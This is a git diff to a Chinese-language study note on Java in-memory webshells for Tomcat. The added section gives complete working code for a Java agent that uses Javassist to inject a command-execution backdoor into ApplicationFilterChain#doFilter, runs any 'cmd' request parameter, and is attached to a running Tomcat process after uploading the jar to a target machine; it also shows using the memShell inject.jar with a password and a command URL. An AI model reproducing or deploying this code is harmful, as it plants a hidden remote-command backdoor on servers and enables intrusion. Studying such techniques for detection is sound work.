@@ -2118,7 +2118,11 @@ jcmd 23308 JVMTI.agent_load E:\java\agent\target\agent-1.0-SNAPSHOT-jar-with-dep
 
 ---
 
-如果不能执行命令，怎么将jar包附加到正在运行的程序中
+
+
+
+
+**如果不能执行命令，怎么将jar包附加到正在运行的程序中**
 
 首先先创建一个Main.java
 
@@ -2273,17 +2277,340 @@ agent具有在程序运行时动态修改程序类的字节码的能力
 
 ![](../image/java内存马学习-83.png)
 
+可以看到applicationfilterchain出现了很多次，并且观察到这个类中能拿到request和response参数
+
+对构造恶意代码很重要
+
+所以在调用过程中存在一个ApplicationFilterChain#doFilter(request, response, chain)，根据Tomcat的请求传递过程（如下图），请求必定经过Filter链。也就是说，只要项目中存在Filter，则ApplicationFilterChain#doFilter必定被调用。
+
+![](../image/java内存马学习-84.png)
 
 
 
+所以我们可以在请求的必经之路上设下条件：如果请求参数中包含cmd参数，则执行参数中的命令
 
+```
+String cmd = request.getParameter("cmd");
+if (cmd != null) {
+    try {
+        Process proc = Runtime.getRuntime().exec(cmd);
+        java.io.InputStream in = proc.getInputStream();
+        java.io.BufferedReader br = new java.io.BufferedReader(new
+java.io.InputStreamReader(in));
+        response.setContentType("text/html");
+        String line;
+        java.io.PrintWriter out = response.getWriter();
+        while ((line = br.readLine()) != null) {
+            out.println(line);
+            out.flush();
+            out.close();
+        }
+    } catch (Exception e) {
+        throw new RuntimeException(e);
+    }
+}
+```
 
+我们需要将这段代码插入正在运行的Tomcat进程中
 
+**tomcat运行起来，我们要使用agentmain的方式将agent jar包attach到tomcat进程上。**
 
+**其次我们需要找到tomcat对应的进程号是什么**
 
+在tomcat目录下运行：
 
+```
+bin\catalina.bat run
+```
 
+![](../image/java内存马学习-85.png)
 
+可以看到tomcat启动起来了
+
+**然后使用jps命令找到对应进程：**
+
+```
+jps -l
+```
+
+![](../image/java内存马学习-86.png)
+
+可以很明显看到tomcat的进程
+
+```
+25024 org.apache.catalina.startup.Bootstrap
+```
+
+进程号每次会变化，但是类名不变，对应的启动类名称固定为：org.apache.catalina.startup.Bootstrap
+
+我们要编写出我们的agent jar包：
+
+新开一个maven项目
+
+打包插件配置如下：（注意，没有Premain-Class配置）
+
+```
+<build>
+    <plugins>
+        <plugin>
+            <groupId>org.apache.maven.plugins</groupId>
+            <artifactId>maven-assembly-plugin</artifactId>
+            <configuration>
+                <descriptorRefs>
+                    <descriptorRef>jar-with-dependencies</descriptorRef>
+                </descriptorRefs>
+                <archive>
+                    <manifestEntries>
+                        <Main-Class>test</Main-Class>
+                        <Agent-Class>AgentMainTest</Agent-Class>
+                        <Can-Redefine-Classes>true</Can-Redefine-Classes>
+                        <Can-Retransform-Classes>true</Can-Retransform-Classes>
+                    </manifestEntries>
+                </archive>
+            </configuration>
+            <executions>
+                <execution>
+                    <id>make-assembly</id>
+                    <phase>package</phase>
+                    <goals>
+                        <goal>single</goal>
+                    </goals>
+                </execution>
+            </executions>
+        </plugin>
+    </plugins>
+</build>
+```
+
+添加javassist依赖
+
+```
+<dependency>
+    <groupId>org.javassist</groupId>
+    <artifactId>javassist</artifactId>
+    <version>3.30.2-GA</version>
+</dependency>
+```
+
+然后就去编写我们的AgentMain
+
+`AgentMainTest.java`
+
+```
+import java.lang.instrument.Instrumentation;
+import java.lang.instrument.UnmodifiableClassException;
+
+public class AgentMainTest {
+
+    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
+        inst.addTransformer(new MyTransformer(), true);
+        // 遍历当前 JVM 中所有已经被加载的类
+        for (Class<?> clazz : inst.getAllLoadedClasses()) {
+            // 精准定位 Tomcat 处理请求的核心类 ApplicationFilterChain
+            if (clazz.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
+                try {
+                    // 触发该类的重新转换，强制 JVM 调用 MyTransformer 对该类进行字节码修改
+                    inst.retransformClasses(clazz);
+                } catch (UnmodifiableClassException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }
+    }
+}
+```
+
+大概逻辑就是遍历所有已加载的类，找到这个类`org.apache.catalina.core.ApplicationFilterChain`就对这个类重新做转换
+
+转换就用我们自己定义的转换方法MyTransfomer
+
+MyTransformer实现类字节码的替换工作，在执行doFilter之前插入一段：若存在cmd参数，则返回cmd参数运行结果。
+
+`MyTransformer.java`
+
+```
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import javassist.LoaderClassPath;
+import java.io.ByteArrayInputStream;
+
+public class MyTransformer implements ClassFileTransformer {
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
+                            ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+        
+        // 匹配 Tomcat 处理请求的核心类
+        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")) {
+            ClassPool pool = ClassPool.getDefault();
+            pool.appendClassPath(new LoaderClassPath(loader));
+            try {
+                CtClass cc = pool.makeClass(new ByteArrayInputStream(classfileBuffer));
+                CtMethod doFilter = cc.getDeclaredMethod("doFilter");
+                
+                // 核心补充：在 doFilter 方法执行前插入恶意逻辑
+                doFilter.insertBefore("{ " +
+                    "String cmd = request.getParameter(\"cmd\"); " +
+                    "if (cmd != null) { " +
+                        "try { " +
+                            "Process process = Runtime.getRuntime().exec(cmd); " +
+                            "java.io.InputStream in = process.getInputStream(); " +
+                            "java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(in)); " +
+                            "response.setContentType(\"text/html\"); " +
+                            "java.io.PrintWriter out = response.getWriter(); " +
+                            "String line; " +
+                            "while ((line = br.readLine()) != null) { " +
+                                "out.println(line); " +
+                            "} " +
+                            "out.flush(); " +
+                            "out.close(); " +
+                        "} catch (Exception e) { " +
+                            "e.printStackTrace(); " +
+                        "} " +
+                    "} " +
+                "}");
+                
+                return cc.toBytecode();
+            } catch (Exception e) {
+                throw new RuntimeException(e);
+            }
+        }
+        
+        // 如果不是目标类，则跳过
+        return ClassFileTransformer.super.transform(loader, className, classBeingRedefined, protectionDomain, classfileBuffer);
+    }
+}
+```
+
+匹配 Tomcat 处理请求的核心类，然后在 doFilter 方法执行前插入恶意逻辑
+
+打包
+
+```
+mvn clean package
+```
+
+然后就要用jcmd命令去attach这个jar包到tomcat进程，所以需要写jar的路径和tomcat的pid进程号
+
+这里可以用一个test类来完成这个操作
+
+`test.java`
+
+```
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.security.ProtectionDomain;
+
+public class test {
+
+    public static String getJar(Class<?> clazz){
+        // 获取类所在的JAR包路径
+        ProtectionDomain protectionDomain = clazz.getProtectionDomain();
+        URL location = protectionDomain.getCodeSource().getLocation();
+        // 提取JAR包名称
+        String path = location.getPath();
+        if (System.getProperty("os.name").toLowerCase().contains("win")&&path.startsWith("/"))
+            path = path.substring(1);
+        return path;
+    }
+
+    // 执行jps -l，并获取类名对应的进程号
+    public static String getPID(String className){
+        try {
+            Process process = Runtime.getRuntime().exec("jps -l");
+            BufferedReader bufferedReader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                if (line.contains(className)){
+                    return line.split(" ")[0];
+                }
+            }
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+        return null;
+    }
+    
+}
+```
+
+重新打包
+
+然后只需要把我们这个包上传到目标tomcat所在机器，然后执行
+
+```
+java -jar jar包路径
+```
+
+我这里开启了tomcat进行测试
+
+```
+java -jar E:\java\agent-demo3\target\agent-demo3-1.0-SNAPSHOT-jar-with-dependencies.jar
+```
+
+![](../image/java内存马学习-87.png)
+
+可以看到我们的jar包成功加载了
+
+然后去localhost:8080对我们的内存马进行测试
+
+![](../image/java内存马学习-88.png)
+
+命令成功执行，说明成功注入了
+
+---
+
+## 冰蝎作者写的agetn内存马
+
+**reBeyond师傅的内存马**
+
+冰蝎作者写的Agent内存马
+
+https://github.com/reBeyond/memShell
+
+使用方式：上传inject.jar到目标机器，并执行命令
+
+测试
+
+**注意：这里要用tomcat 9以下，不能用10，否则注入会失败，因为**
+
+- **Tomcat 9 及以下**：使用的是 **`javax.servlet.\*`**
+- **Tomcat 10 及以上**：使用的是 **`jakarta.servlet.\*`**
+
+先关闭重启我们的tomcat服务器
+
+```
+bin\catalina.bat run
+```
+
+再次访问发现?cmd参数已经不起作用了，内存中的恶意代码失效了
+
+然后使用java -jar
+
+```
+java -jar inject.jar *密码*
+
+我这里用mixbp
+java -jar inject.jar mixbp
+```
+
+成功注入
+
+![](../image/java内存马学习-89.png)
+
+然后就可以通过访问如下url执行命令
+
+```
+anyurl?pass_the_world=pass&model=exec&cmd=whoami
+```
+
+![](../image/java内存马学习-90.png)
 
 
 
@@ -2295,17 +2622,25 @@ agent具有在程序运行时动态修改程序类的字节码的能力
 
 
 
-
-
-
-
-
-
-
-
-
-
 ## JNDI注入内存马
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -2333,7 +2668,27 @@ agent具有在程序运行时动态修改程序类的字节码的能力
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
 ## 反序列化注入内存马
+
+
+
+
+
+
+
+
 
 
 
